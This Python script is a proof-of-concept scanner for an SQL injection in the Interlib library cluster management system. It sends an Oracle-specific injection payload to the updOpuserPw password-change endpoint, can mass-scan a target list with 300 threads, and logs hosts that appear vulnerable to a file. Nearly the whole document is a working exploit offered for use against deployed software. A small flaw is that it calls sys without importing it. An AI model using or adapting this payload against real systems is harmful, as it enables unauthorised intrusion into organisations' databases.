# 
import requests,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """
  __               .__              __.__                     
_/  |_ __ __  _____|  |__  __ __   |__|__| ________ __  ____  
\   __\  |  \/  ___/  |  \|  |  \  |  |  |/ ____/  |  \/    \ 
 |  | |  |  /\___ \|   Y  \  |  /  |  |  < <_|  |  |  /   |  \
 |__| |____//____  >___|  /____/\__|  |__|\__   |____/|___|  /
                 \/     \/     \______|      |__|          \/ 
                                     info:图书馆集群管理系统interlib updOpuserPw SQL注入漏洞
	"""
	print(banner)
def poc(target):
	payload_url = "/interlib3/service/sysop/updOpuserPw?loginid=test&newpassword=12356&token=1%27and+ctxsys.drithsx.sn(1,(select%20MOD(9,9)%20from%20dual))=%272"
	url = target + payload_url
	headers={
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
	        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
	        'Accept-Encoding':'gzip, deflate',
	        'Connection':'close',
	        'Upgrade-Insecure-Requests':'1',
	}
	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.get(url=url,headers=headers,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and "message" in res1.text:
				print(f"{GREEN}[+]该url存在SQL注入漏洞：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在SQL注入漏洞：{target}")
		else:
			print(f"该url连接失败：{target}")
	except:
		print(f"[*]该url出现错误：{target}")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()